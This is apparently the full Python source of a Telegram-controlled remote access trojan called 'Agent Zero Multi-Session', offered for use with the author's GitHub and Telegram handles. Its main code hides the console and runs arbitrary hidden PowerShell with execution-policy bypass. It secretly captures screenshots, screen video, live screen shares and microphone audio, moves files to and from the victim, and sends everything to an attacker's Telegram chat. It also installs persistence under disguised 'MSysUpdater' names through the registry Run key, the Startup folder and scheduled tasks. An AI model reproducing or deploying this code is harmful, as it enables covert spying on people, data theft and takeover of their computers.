#######################################################
####   MyGitHub : https://github.com/The-Lxx-CLoUD ####
####                                               ####
####     MyTelegram : https://t.me/lxxcloud        ####
####                                               ####
####           v2 beta ( tel bot )                 ####
#######################################################

import sys, os, time, random, base64, subprocess, json, platform
import shutil, tempfile, threading, struct, wave, io, traceback, zipfile
from datetime import datetime

try:
    import requests as _req
except:
    os.system("pip install requests -q")
    import requests as _req

HAS_MSS = False
try:
    import mss as _mss
    import mss.tools as _msstools
    HAS_MSS = True
except:
    pass

HAS_SOUNDDEVICE = False
HAS_NUMPY = False
try:
    import sounddevice as _sd
    import numpy as _np
    HAS_SOUNDDEVICE = True
    HAS_NUMPY = True
except:
    pass

HAS_OPENCV = False
try:
    import cv2
    HAS_OPENCV = True
except:
    pass

HAS_PIL = False
try:
    from PIL import Image
    HAS_PIL = True
except:
    pass

# ====== CONFIG ======
BOT_TOKEN = "abcdefg1234"      # bot token 
ADMIN_CHAT_ID = 1234567  # admin chat id ### single == ( "123456" ❌ ) -- ( 123456 ✅ )###
CMD_TIMEOUT = 50
SESSION_NAME = sys.argv[1] if len(sys.argv) > 1 else (platform.node() or "default")
COORD_FILE = os.path.join(tempfile.gettempdir(), f"agent_sessions_{BOT_TOKEN[-8:]}.json")

API = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = 0
pending_upload = None
agent_start_time = 0
screenshare_active = False
screenshare_thread = None
screenvideo_stop = False
agent_instance_id = random.randint(10000, 99999)
LOCAL_MUTEX_HANDLE = None

def acquire_local_mutex():
    global LOCAL_MUTEX_HANDLE
    try:
        import ctypes
        name = "Local\\AgentZero_" + SESSION_NAME + "_" + BOT_TOKEN[-8:]
        LOCAL_MUTEX_HANDLE = ctypes.windll.kernel32.CreateMutexW(None, False, name)
        if not LOCAL_MUTEX_HANDLE:
            return True
        if ctypes.windll.kernel32.GetLastError() == 183:
            ctypes.windll.kernel32.CloseHandle(LOCAL_MUTEX_HANDLE)
            LOCAL_MUTEX_HANDLE = None
            return False
        return True
    except:
        return True

def release_local_mutex():
    global LOCAL_MUTEX_HANDLE
    if LOCAL_MUTEX_HANDLE:
        try:
            import ctypes
            ctypes.windll.kernel32.ReleaseMutex(LOCAL_MUTEX_HANDLE)
            ctypes.windll.kernel32.CloseHandle(LOCAL_MUTEX_HANDLE)
        except:
            pass

def read_coord():
    try:
        if os.path.isfile(COORD_FILE):
            with open(COORD_FILE, "r") as f:
                return json.load(f)
    except:
        pass
    return {"sessions": {}, "active": None, "queue": {}}

def write_coord(data):
    try:
        with open(COORD_FILE, "w") as f:
            json.dump(data, f)
    except:
        pass

def register_session():
    data = read_coord()
    hostname = platform.node() or "unknown"
    username = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    data["sessions"][SESSION_NAME] = {
        "hostname": hostname,
        "username": username,
        "pid": os.getpid(),
        "last_seen": time.time(),
        "status": "online",
        "features": {"screenshot": HAS_MSS, "audio": HAS_SOUNDDEVICE, "video": HAS_OPENCV or HAS_PIL}
    }
    if data["active"] is None:
        data["active"] = SESSION_NAME
    write_coord(data)
    return data

def unregister_session():
    data = read_coord()
    if SESSION_NAME in data.get("sessions", {}):
        data["sessions"][SESSION_NAME]["status"] = "offline"
        data["sessions"][SESSION_NAME]["last_seen"] = time.time()
    if data.get("active") == SESSION_NAME:
        online = [s for s, info in data.get("sessions", {}).items() if info.get("status") == "online" and s != SESSION_NAME]
        data["active"] = online[0] if online else None
    write_coord(data)

def heartbeat():
    data = read_coord()
    if SESSION_NAME in data.get("sessions", {}):
        data["sessions"][SESSION_NAME]["last_seen"] = time.time()
        data["sessions"][SESSION_NAME]["status"] = "online"
    write_coord(data)

def get_active_session():
    data = read_coord()
    active = data.get("active")
    now = time.time()
    for s in list(data.get("sessions", {}).keys()):
        if s != SESSION_NAME and now - data["sessions"][s].get("last_seen", 0) > 120:
            data["sessions"][s]["status"] = "offline"
    write_coord(data)
    return active

def set_active_session(name):
    data = read_coord()
    if name in data.get("sessions", {}):
        data["active"] = name
        write_coord(data)
        return True
    return False

def add_to_queue(target_session, cmd, cmd_id):
    data = read_coord()
    if "queue" not in data:
        data["queue"] = {}
    if target_session not in data["queue"]:
        data["queue"][target_session] = []
    data["queue"][target_session].append({"cmd": cmd, "id": cmd_id, "ts": time.time()})
    write_coord(data)

def pop_queue():
    data = read_coord()
    if SESSION_NAME not in data.get("queue", {}):
        return []
    cmds = data["queue"].get(SESSION_NAME, [])
    data["queue"][SESSION_NAME] = []
    write_coord(data)
    return cmds

def cleanup_stale_queues():
    data = read_coord()
    now = time.time()
    for s in list(data.get("queue", {}).keys()):
        data["queue"][s] = [c for c in data["queue"][s] if now - c.get("ts", 0) < 120]
    write_coord(data)

heartbeat_running = True
def heartbeat_loop():
    global heartbeat_running
    while heartbeat_running:
        try:
            heartbeat()
            cleanup_stale_queues()
            time.sleep(30)
        except:
            time.sleep(30)

def send_msg(text, parse_mode=""):
    try:
        data = {"chat_id": ADMIN_CHAT_ID, "text": text}
        if parse_mode:
            data["parse_mode"] = parse_mode
        _req.post(f"{API}/sendMessage", json=data, timeout=30)
    except:
        pass

def send_msg_markdown(text):
    send_msg(text, parse_mode="Markdown")

def send_file_from_data(file_data, filename):
    try:
        files = {"document": (filename, io.BytesIO(file_data), "application/octet-stream")}
        _req.post(f"{API}/sendDocument", data={"chat_id": ADMIN_CHAT_ID}, files=files, timeout=120)
    except Exception as e:
        send_msg("❌ Send file error: " + str(e)[:50])

def send_file(path):
    if not os.path.isfile(path):
        return
    try:
        with open(path, "rb") as f:
            _req.post(f"{API}/sendDocument", data={"chat_id": ADMIN_CHAT_ID},
                      files={"document": (os.path.basename(path), f)}, timeout=120)
    except Exception as e:
        send_msg("❌ Send error: " + str(e)[:50])

def get_file_data(file_id):
    try:
        r = _req.get(f"{API}/getFile", params={"file_id": file_id}, timeout=30)
        d = r.json()
        if d.get("ok"):
            r2 = _req.get("https://api.telegram.org/file/bot" + BOT_TOKEN + "/" + d['result']['file_path'], timeout=30)
            return r2.content
    except:
        pass
    return None

def delete_webhook():
    try:
        _req.get(f"{API}/deleteWebhook", params={"drop_pending_updates": True}, timeout=10)
    except:
        pass

def hide_console():
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

def run_ps(cmd):
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    try:
        p = subprocess.run(
            ["powershell", "-NoP", "-EP", "Bypass", "-W", "Hidden", "-C", cmd],
            capture_output=True, startupinfo=si, timeout=CMD_TIMEOUT, creationflags=0x08000000
        )
        out = (p.stdout or b"") + (p.stderr or b"")
        return out.decode("utf-8", errors="replace").strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "[!] Timeout"
    except Exception as e:
        return "[!] Error: " + str(e)

def take_screenshot():
    if HAS_MSS:
        try:
            with _mss.mss() as sct:
                mon = sct.monitors[1]
                return _msstools.to_png(sct.grab(mon).rgb, sct.grab(mon).size)
        except:
            pass
    try:
        ps = 'Add-Type -Assembly System.Drawing,System.Windows.Forms;$s=[Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object Drawing.Bitmap($s.Width,$s.Height);$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.X,$s.Y,0,0,$s.Size);$m=New-Object IO.MemoryStream;$b.Save($m,[Drawing.Imaging.ImageFormat]::Png);[Convert]::ToBase64String($m.ToArray())'
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        p = subprocess.run(["powershell", "-NoP", "-EP", "Bypass", "-W", "Hidden", "-C", ps],
                          capture_output=True, timeout=30, startupinfo=si)
        out = (p.stdout or b"").decode("utf-8", errors="replace").strip()
        if out:
            return base64.b64decode(out)
    except:
        pass
    return None

def cmd_screenshot():
    send_msg("📸 [" + SESSION_NAME + "] Capturing screenshot...")
    d = take_screenshot()
    if d:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        send_file_from_data(d, "screenshot_" + SESSION_NAME + "_" + ts + ".png")
    else:
        send_msg("❌ [" + SESSION_NAME + "] Screenshot failed")

def record_audio(dur):
    if HAS_SOUNDDEVICE and HAS_NUMPY:
        try:
            fs = 44100
            send_msg("🎤 [" + SESSION_NAME + "] Recording " + str(dur) + "s...")
            rec = _sd.rec(int(dur * fs), samplerate=fs, channels=2, dtype='int16')
            _sd.wait()
            buf = io.BytesIO()
            with wave.open(buf, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(rec.tobytes())
            send_msg("✅ [" + SESSION_NAME + "] Recorded " + str(dur) + "s")
            return buf.getvalue()
        except:
            pass
    return None

def cmd_record(duration):
    duration = max(1, min(duration, 300))
    d = record_audio(duration)
    if d:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        send_file_from_data(d, "recording_" + SESSION_NAME + "_" + ts + "_" + str(duration) + "s.wav")
    else:
        send_msg("❌ [" + SESSION_NAME + "] Audio unavailable")

def screenshare_worker():
    global screenshare_active
    fc = 0
    send_msg("🖥️ [" + SESSION_NAME + "] Screen share started. Send 'screenshare_stop' to end.")
    while screenshare_active:
        try:
            d = take_screenshot()
            if d:
                fc += 1
                send_file_from_data(d, "frame_" + SESSION_NAME + "_" + str(fc).zfill(3) + ".png")
            for _ in range(50):
                if not screenshare_active:
                    break
                time.sleep(0.1)
        except:
            break
    send_msg("🖥️ [" + SESSION_NAME + "] Screen share ended (" + str(fc) + " frames).")

def cmd_screenshare():
    global screenshare_active, screenshare_thread
    if screenshare_active:
        return
    screenshare_active = True
    screenshare_thread = threading.Thread(target=screenshare_worker, daemon=True)
    screenshare_thread.start()

def cmd_screenshare_stop():
    global screenshare_active
    if not screenshare_active:
        return
    screenshare_active = False
    send_msg("⏹️ [" + SESSION_NAME + "] Stopping screen share...")

def ensure_opencv():
    global HAS_OPENCV
    if HAS_OPENCV:
        return True
    try:
        send_msg("⚙️ [" + SESSION_NAME + "] Installing opencv-python...")
        os.system("pip install opencv-python-headless -q")
        import cv2
        HAS_OPENCV = True
        return True
    except:
        return False

def ensure_pil():
    global HAS_PIL
    if HAS_PIL:
        return True
    try:
        os.system("pip install Pillow -q")
        from PIL import Image
        HAS_PIL = True
        return True
    except:
        return False

def record_screen_video(duration, fps=8):
    """
    ضبط صفحه به مدت duration ثانیه با fps فریم در ثانیه
    برمیگردونه: (file_path, file_size, method_name)
    روش‌ها: MP4 > GIF > ZIP
    """
    if not HAS_MSS:
        send_msg("⚠️ [" + SESSION_NAME + "] mss not installed. Try: pip install mss")
        return None, 0, "none"

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    safe_name = SESSION_NAME.replace('/', '_').replace('\\', '_')

    
    if ensure_opencv():
        try:
            import cv2 as _cv2
            import numpy as _np

            send_msg("🎬 [" + SESSION_NAME + "] Recording " + str(duration) + "s video (OpenCV)...")

            with _mss.mss() as sct:
                mon = sct.monitors[1]
                w = mon['width']
                h = mon['height']

                fourcc_list = [
                    (_cv2.VideoWriter_fourcc(*'mp4v'), '.mp4'),
                    (_cv2.VideoWriter_fourcc(*'XVID'), '.avi'),
                    (_cv2.VideoWriter_fourcc(*'MJPG'), '.avi'),
                ]

                out_path = None
                writer = None
                fourcc_used = None

                for fourcc, ext in fourcc_list:
                    try:
                        test_path = os.path.join(tempfile.gettempdir(), "test_write" + ext)
                        test_writer = _cv2.VideoWriter(test_path, fourcc, fps, (w, h))
                        if test_writer.isOpened():
                            test_writer.release()
                            os.remove(test_path)
                            fourcc_used = fourcc
                            out_path = os.path.join(tempfile.gettempdir(), "screenvideo_" + safe_name + "_" + timestamp + ext)
                            writer = _cv2.VideoWriter(out_path, fourcc, fps, (w, h))
                            if writer.isOpened():
                                break
                        else:
                            test_writer.release()
                    except:
                        pass

                if writer is None:
                    fourcc_used = _cv2.VideoWriter_fourcc(*'mp4v')
                    out_path = os.path.join(tempfile.gettempdir(), "screenvideo_" + safe_name + "_" + timestamp + ".mp4")
                    writer = _cv2.VideoWriter(out_path, fourcc_used, fps, (w, h))

                if not writer or not writer.isOpened():
                    raise Exception("Could not create VideoWriter")

                start = time.time()
                frame_count = 0

                while time.time() - start < duration:
                    img = sct.grab(mon)
                    frame = _np.array(img)
                    frame = _cv2.cvtColor(frame, _cv2.COLOR_BGRA2BGR)
                    writer.write(frame)
                    frame_count += 1

                    elapsed = time.time() - start
                    expected_frames = elapsed * fps
                    if frame_count > expected_frames:
                        time.sleep(max(0, 1.0/fps - 0.01))

                writer.release()

                file_size = os.path.getsize(out_path)
                send_msg("✅ [" + SESSION_NAME + "] Video: " + str(frame_count) + " frames, " + str(file_size//1024) + "KB")

                return out_path, file_size, "MP4"

        except Exception as e:
            send_msg("⚠️ [" + SESSION_NAME + "] OpenCV error: " + str(e)[:80] + ", trying GIF...")

    
    if ensure_pil():
        try:
            from PIL import Image as _PILImage

            send_msg("🎬 [" + SESSION_NAME + "] Recording " + str(duration) + "s video (GIF)...")

            frames = []
            with _mss.mss() as sct:
                mon = sct.monitors[1]
                start = time.time()
                last_frame_time = 0

                while time.time() - start < duration:
                    now = time.time()
                    if now - last_frame_time < 1.0/fps:
                        time.sleep(0.05)
                        continue
                    last_frame_time = now

                    img = sct.grab(mon)
                    pil_img = _PILImage.frombytes('RGB', img.size, img.rgb)
                    if pil_img.width > 800:
                        ratio = 800.0 / pil_img.width
                        new_size = (800, int(pil_img.height * ratio))
                        pil_img = pil_img.resize(new_size, _PILImage.LANCZOS)
                    frames.append(pil_img)

                if not frames:
                    raise Exception("No frames captured")

                gif_buffer = io.BytesIO()
                frames[0].save(
                    gif_buffer,
                    format='GIF',
                    save_all=True,
                    append_images=frames[1:],
                    duration=max(1, int(1000.0/fps)),
                    loop=0,
                    optimize=True
                )

                gif_size = gif_buffer.tell()

                if gif_size > 45 * 1024 * 1024:
                    send_msg("⚠️ [" + SESSION_NAME + "] GIF too large (" + str(gif_size//1024//1024) + "MB), sending first 100 frames...")
                    limited_frames = frames[:100]
                    gif_buffer = io.BytesIO()
                    limited_frames[0].save(
                        gif_buffer, format='GIF', save_all=True,
                        append_images=limited_frames[1:],
                        duration=max(1, int(1000.0/fps)), loop=0, optimize=True
                    )

                gif_path = os.path.join(tempfile.gettempdir(), "screenvideo_" + safe_name + "_" + timestamp + ".gif")
                with open(gif_path, "wb") as f:
                    f.write(gif_buffer.getvalue())

                file_size = os.path.getsize(gif_path)
                send_msg("✅ [" + SESSION_NAME + "] GIF: " + str(len(frames)) + " frames, " + str(file_size//1024) + "KB")

                return gif_path, file_size, "GIF"

        except Exception as e:
            send_msg("⚠️ [" + SESSION_NAME + "] GIF error: " + str(e)[:80] + ", trying ZIP...")

    # === METHOD 3: ZIP of screenshots ===
    try:
        send_msg("🎬 [" + SESSION_NAME + "] Recording " + str(duration) + "s video (ZIP frames)...")

        zip_buffer = io.BytesIO()
        frame_count = 0

        with _mss.mss() as sct:
            mon = sct.monitors[1]
            start = time.time()

            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                while time.time() - start < duration:
                    img = sct.grab(mon)
                    png_data = _msstools.to_png(img.rgb, img.size)
                    frame_count += 1
                    zf.writestr("frame_" + str(frame_count).zfill(4) + ".png", png_data)
                    time.sleep(1.0/fps)

        zip_path = os.path.join(tempfile.gettempdir(), "screenvideo_" + safe_name + "_" + timestamp + ".zip")
        with open(zip_path, "wb") as f:
            f.write(zip_buffer.getvalue())

        file_size = os.path.getsize(zip_path)

        if file_size > 45 * 1024 * 1024:
            send_msg("⚠️ [" + SESSION_NAME + "] ZIP too large (" + str(file_size//1024//1024) + "MB), first 50 frames...")
            zip_buffer2 = io.BytesIO()
            with _mss.mss() as sct2:
                mon2 = sct2.monitors[1]
                for i in range(min(50, frame_count)):
                    png_data = _msstools.to_png(sct2.grab(mon2).rgb, sct2.grab(mon2).size)
                    with zipfile.ZipFile(zip_buffer2, 'w', zipfile.ZIP_DEFLATED) as zf:
                        zf.writestr("frame_" + str(i+1).zfill(4) + ".png", png_data)
            with open(zip_path, "wb") as f:
                f.write(zip_buffer2.getvalue())
            file_size = os.path.getsize(zip_path)

        send_msg("✅ [" + SESSION_NAME + "] ZIP: " + str(frame_count) + " frames, " + str(file_size//1024) + "KB")
        return zip_path, file_size, "ZIP"

    except Exception as e:
        send_msg("❌ [" + SESSION_NAME + "] All recording methods failed: " + str(e)[:100])
        return None, 0, "none"

def cmd_screenvideo(duration):
    if not HAS_MSS:
        send_msg("❌ [" + SESSION_NAME + "] mss not installed. Run: pip install mss")
        return

    duration = max(1, min(duration, 60))
    result = record_screen_video(duration)

    if result and result[0]:
        file_path, file_size, method = result
        if file_size > 45 * 1024 * 1024:
            send_msg("⚠️ [" + SESSION_NAME + "] File is " + str(file_size//1024//1024) + "MB (Telegram limit: 50MB). Sending anyway...")

        try:
            with open(file_path, "rb") as f:
                file_data = f.read()
            ext = os.path.splitext(file_path)[1]
            send_file_from_data(
                file_data,
                "screenvideo_" + SESSION_NAME + "_" + str(duration) + "s_" + method + ext
            )
            send_msg("✅ [" + SESSION_NAME + "] Screen video sent! (" + method + ", " + str(file_size//1024) + "KB)")
        except Exception as e:
            send_msg("❌ [" + SESSION_NAME + "] Send error: " + str(e)[:80])

        try:
            os.remove(file_path)
        except:
            pass
    else:
        send_msg("❌ [" + SESSION_NAME + "] Screen recording failed completely.")


def do_persist():
    try:
        src = os.path.abspath(sys.argv[0])
        dst_dir = os.path.join(os.environ.get("APPDATA", "~"), "MSysHelper")
        os.makedirs(dst_dir, exist_ok=True)
        ext = ".exe" if src.lower().endswith(".exe") else ".pyw"
        dst = os.path.join(dst_dir, "syshelper" + ext)
        if os.path.abspath(src) != os.path.abspath(dst):
            if os.path.isfile(dst):
                try:
                    os.remove(dst)
                except:
                    pass
            with open(src, "rb") as f_s:
                with open(dst, "wb") as f_d:
                    shutil.copyfileobj(f_s, f_d, length=1024*1024)
        if ext == ".exe":
            runner = '"' + dst + '"'
        else:
            pw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            if not os.path.isfile(pw):
                try:
                    proc = subprocess.run(["where", "pythonw.exe"], capture_output=True, text=True, timeout=5)
                    pw = proc.stdout.strip().split("\n")[0] if proc.stdout.strip() else "pythonw.exe"
                except:
                    pw = "pythonw.exe"
            runner = '"' + pw + '" "' + dst + '"'
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        subprocess.run(["schtasks", "/delete", "/tn", "MSysUpdater", "/f"], capture_output=True, startupinfo=si)
        subprocess.run(["schtasks", "/delete", "/tn", "MSysHealth", "/f"], capture_output=True, startupinfo=si)
        subprocess.run(["reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "MSysUpdater", "/t", "REG_SZ", "/d", runner, "/f"], capture_output=True, startupinfo=si)
        startup = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
        if os.path.isdir(startup):
            try:
                sd = os.path.join(startup, "syshelper" + ext)
                with open(src, "rb") as f_s:
                    with open(sd, "wb") as f_d:
                        shutil.copyfileobj(f_s, f_d, length=1024*1024)
            except:
                pass
        subprocess.run(["schtasks", "/create", "/tn", "MSysUpdater", "/sc", "onlogon", "/tr", runner, "/f"], capture_output=True, startupinfo=si)
        return "✅ [" + SESSION_NAME + "] Persistence OK -> " + dst
    except Exception as e:
        return "❌ [" + SESSION_NAME + "] Persist error: " + str(e)


def cmd_sessions():
    data = read_coord()
    active = data.get("active", "?")
    sessions = data.get("sessions", {})
    if not sessions:
        send_msg("📭 No sessions registered.")
        return
    lines = ["📡 **Active Sessions:**", "Active: `" + str(active) + "`", "Me: `" + SESSION_NAME + "`", "───"]
    now = time.time()
    for s, info in sorted(sessions.items()):
        status = info.get("status", "?")
        last_seen = now - info.get("last_seen", 0)
        if status == "online" and last_seen < 60:
            icon = "🟢"
        elif status == "offline":
            icon = "🔴"
        else:
            icon = "🟡"
        is_me = " ⬅️" if s == SESSION_NAME else ""
        is_active = " 👑" if s == active else ""
        feats = ""
        f = info.get("features", {})
        if f.get("screenshot"):
            feats += "📸"
        if f.get("audio"):
            feats += "🎤"
        if f.get("video"):
            feats += "🎬"
        lines.append(icon + " `" + s + "` (" + info.get('hostname', '?') + ") " + feats + is_me + is_active)
    lines.append("───")
    lines.append("`@PC1 cmd` | `! broadcast` | `use PC2`")
    send_msg("\n".join(lines), parse_mode="Markdown")


def get_session_from_cmd(text):
    parts = text.split(None, 1)
    if parts and parts[0].startswith("@"):
        target = parts[0][1:]
        cmd = parts[1] if len(parts) > 1 else ""
        return target, cmd
    if parts and parts[0] == "!":
        cmd = parts[1] if len(parts) > 1 else ""
        return "BROADCAST", cmd
    return None, text


def forward_to_session(target, cmd_text, cmd_id):
    add_to_queue(target, cmd_text, cmd_id)
    send_msg("⏩ Forwarded `" + cmd_text[:50] + "` → [" + target + "]", parse_mode="Markdown")


def execute_local(cmd_text):
    global pending_upload
    low = cmd_text.lower().strip()

    if low == "pwd":
        send_msg(os.getcwd())

    elif low.startswith("cd "):
        try:
            os.chdir(cmd_text[3:].strip())
            send_msg(os.getcwd())
        except Exception as e:
            send_msg("❌ cd: " + str(e))

    elif low.startswith("download "):
        send_file(cmd_text[9:].strip())

    elif low.startswith("upload "):
        user_path = cmd_text[7:].strip()
        if user_path:
            pending_upload = (user_path, time.time())
            send_msg("📤 Send file → `" + user_path + "`", parse_mode="Markdown")
        else:
            cwd = os.getcwd()
            pending_upload = (cwd, time.time())
            send_msg("📤 Send file → current directory: `" + cwd + "`", parse_mode="Markdown")

    elif low == "screenshot":
        cmd_screenshot()

    elif low == "sg1":
        send_msg_markdown(
            "📚 **Multi-Session Commands**\n"
            
            "**Capture:**\n"
            "`screenshot` — Taking a screenshot 📸\n"
            "`screenvideo 10` — Video from screen 🎬 (1–60 seconds)\n"
            "`record 10` — Audio Recording 🎤 (1–60 seconds) \n"
            "`screenshare` — Send photo every 5 seconds 🖥️\n"
            "`screenshare_stop` — Stop screen sharing \n\n"

            "**Files:**\n"
            "`upload C:\\Users` → Custom path \n"
            "`download ` (ex: download ali.png) → download file\n"
            "`cd` (ex: cd C:/Users) → Custom path \n"
            "`pwd` → Current path \n\n"

            "**System:**\n"
            "`persist` | `exit`\n\n"
           
            "dev : @lxxcloud"
        )
        

    elif low.startswith("record "):
        try:
            d = int(cmd_text.split()[1])
        except:
            d = 10
        cmd_record(d)

    elif low.startswith("screenvideo "):
        try:
            d = int(cmd_text.split()[1])
        except:
            d = 10
        cmd_screenvideo(d)

    elif low == "screenvideo":
        cmd_screenvideo(10)

    elif low == "screenshare":
        cmd_screenshare()

    elif low == "screenshare_stop":
        cmd_screenshare_stop()

    elif low == "persist":
        send_msg(do_persist())

    elif low == "exit":
        unregister_session()
        send_msg("""👋 Disconnected.
dev : @lxxcloud""")
        return False

    else:
        result = run_ps(cmd_text)
        if len(result) > 3900:
            result = result[:3900] + "\n\n...(truncated)"
        send_msg("`[" + SESSION_NAME + "]`\n" + result[:3500], parse_mode="Markdown")

    return True


def is_stale(msg):
    return msg.get("date", 0) < agent_start_time

def process(update):
    global last_update_id, pending_upload, screenshare_active
    last_update_id = update["update_id"] + 1
    msg = update.get("message", {})
    if msg.get("chat", {}).get("id") != ADMIN_CHAT_ID:
        return True
    if is_stale(msg):
        return True

    for qc in pop_queue():
        qtext = qc.get("cmd", "")
        if qtext:
            execute_local(qtext)

    text = msg.get("text", "").strip()
    has_doc = "document" in msg

    if pending_upload:
        remote_path, ts = pending_upload
        if time.time() - ts > 120:
            pending_upload = None
            return True
        if has_doc:
            data = get_file_data(msg["document"]["file_id"])
            if data:
                try:
                    file_name = msg["document"].get("file_name", "unknown_file")
                    expanded = os.path.expandvars(remote_path)
                    if os.path.isdir(expanded) or expanded.endswith(('\\', '/')):
                        save_path = os.path.join(expanded, file_name)
                    else:
                        save_path = expanded
                    os.makedirs(os.path.dirname(save_path), exist_ok=True)
                    with open(save_path, "wb") as f:
                        f.write(data)
                    send_msg("✅ [" + SESSION_NAME + "] Uploaded `" + file_name + "` (" + str(len(data)) + "b) → `" + save_path + "`", parse_mode="Markdown")
                except Exception as e:
                    send_msg("❌ [" + SESSION_NAME + "] Upload error: " + str(e))
            else:
                send_msg("❌ Failed to get file")
            pending_upload = None
            return True
        return True

    if has_doc and not text:
        send_msg("❌ First type `upload` or `upload C:\\path` then send the file.", parse_mode="Markdown")
        return True
    if not text:
        return True

    return handle_command(text)


def handle_command(text):
    global pending_upload
    target, cmd = get_session_from_cmd(text)

    if target is None:
        low = text.lower().strip()

        if low == "help":
            msg = (
                "📚 **Multi-Session Commands**\n───\n"
                "**Session Control:**\n"
                "`sessions` | `use PC1` | `active` | `me`\n\n"
                "**Capture:**\n"
                "`screenshot` — عکس از صفحه 📸\n"
                "`screenvideo 10` — ویدیو از صفحه 🎬 (1-60 ثانیه)\n"
                "`record 10` — ضبط صدا 🎤\n"
                "`screenshare` — اشتراک زنده 🖥️\n\n"
                "**Files:**\n"
                "`upload` → فایل به مسیر فعلی\n"
                "`upload C:\\path` → مسیر دلخواه\n"
                "`download C:\\path` → دریافت فایل\n"
                "`pwd` | `cd folder`\n\n"
                "**Targeted:**\n"
                "`@PC1 screenshot` ← روی PC1 اجرا کن\n"
                "`! dir` ← روی همه سشن‌ها اجرا کن\n\n"
                "**System:**\n"
                "`persist` | `exit` | `exit_all`\n\n"
                "**Session:** `" + SESSION_NAME + "` | **Active:** `" + str(get_active_session()) + "`"
            )
            send_msg_markdown(msg)
        elif low == "sessions":
            cmd_sessions()
        elif low == "active":
            active = get_active_session()
            m = "👑 Active session: `" + str(active) + "`"
            if active == SESSION_NAME:
                m += " ⬅️ YOU"
            send_msg(m, parse_mode="Markdown")
        elif low == "me":
            feats = ""
            if HAS_MSS:
                feats += "📸 "
            if HAS_SOUNDDEVICE:
                feats += "🎤 "
            if HAS_OPENCV or HAS_PIL:
                feats += "🎬 "
            send_msg("🖥️ `" + SESSION_NAME + "` on " + platform.node() + "\nPID: " + str(os.getpid()) + "\n" + (feats.strip() or 'no features'), parse_mode="Markdown")
        elif low.startswith("use "):
            target_name = text[4:].strip().upper()
            if set_active_session(target_name):
                send_msg("👑 Active session changed to `" + target_name + "`", parse_mode="Markdown")
            else:
                send_msg("❌ Session `" + target_name + "` not found. Use `sessions`.", parse_mode="Markdown")
        elif low == "exit":
            unregister_session()
            send_msg("""👋Disconnected.
dev : @lxxcloud""")
            return False
        elif low == "exit_all":
            send_msg("🛑 Exiting all sessions...")
            data = read_coord()
            for s in data.get("sessions", {}):
                if s != SESSION_NAME:
                    add_to_queue(s, "exit", "exit_" + str(time.time()))
            time.sleep(1)
            unregister_session()
            return False
        else:
            active = get_active_session()
            if active != SESSION_NAME and active:
                forward_to_session(active, text, int(time.time()))
                return True
            elif active is None:
                set_active_session(SESSION_NAME)
            return execute_local(text)

    elif target == "BROADCAST":
        if cmd.strip():
            data = read_coord()
            for s in data.get("sessions", {}):
                if s != SESSION_NAME and data["sessions"][s].get("status") == "online":
                    add_to_queue(s, cmd, "b_" + str(int(time.time())))
            send_msg("📢 Broadcasting: `" + cmd + "`", parse_mode="Markdown")
            return execute_local(cmd)
        return True
    else:
        target_upper = target.upper()
        if target_upper == SESSION_NAME:
            return execute_local(cmd) if cmd.strip() else True
        else:
            data = read_coord()
            if target_upper in data.get("sessions", {}):
                forward_to_session(target_upper, cmd, int(time.time()))
            else:
                send_msg("❌ Session `" + target_upper + "` not found.", parse_mode="Markdown")
            return True


def main():
    global agent_start_time, last_update_id, heartbeat_running

    print("[*] Agent Zero Multi-Session v7.1")
    print("    Session: " + SESSION_NAME + " | PID: " + str(os.getpid()))

    if not acquire_local_mutex():
        print("[!] Duplicate '" + SESSION_NAME + "' on this machine. Exiting.")
        return
    print("[+] Local mutex acquired.")

    delete_webhook()
    register_session()
    print("    Registered as '" + SESSION_NAME + "'")

    hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    hb_thread.start()
    time.sleep(2)
    hide_console()

    agent_start_time = int(time.time())
    time.sleep(1)

    try:
        r = _req.get(f"{API}/getUpdates", params={"offset": 0, "timeout": 2}, timeout=5)
        d = r.json()
        if d.get("ok"):
            for u in d.get("result", []):
                last_update_id = u["update_id"] + 1
    except:
        pass

    hostname = platform.node() or "unknown"
    username = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    feats = []
    if HAS_MSS:
        feats.append("📸")
    if HAS_SOUNDDEVICE:
        feats.append("🎤")
    if HAS_OPENCV or HAS_PIL:
        feats.append("🎬")
    active = get_active_session()
    is_active = " 👑 ACTIVE" if active == SESSION_NAME else ""

    welcome_msg = (
        "✅ **Connected**\n"
        f"🖥️ **Host : ** `{hostname}`\n"
        f"👤 **User : ** `{username}`\n"
        f"📂 **PWD : ** `{os.getcwd()}`\n"
        f"📩 send 👉 `sg1` 👈 To view the commands"
    )
    send_msg_markdown(welcome_msg)
    print("[+] Connected. Check Telegram!")

    backoff = 1
    while True:
        try:
            r = _req.get(f"{API}/getUpdates", params={"offset": last_update_id, "timeout": 10}, timeout=15)
            d = r.json()
            if d.get("ok"):
                backoff = 1
                for u in d.get("result", []):
                    if not process(u):
                        heartbeat_running = False
                        release_local_mutex()
                        return
            else:
                if d.get("error_code") == 409:
                    time.sleep(random.uniform(1, 3))
                    continue
                time.sleep(5)
        except _req.exceptions.Timeout:
            pass
        except _req.exceptions.ConnectionError:
            time.sleep(backoff)
            backoff = min(backoff * 2, 60)
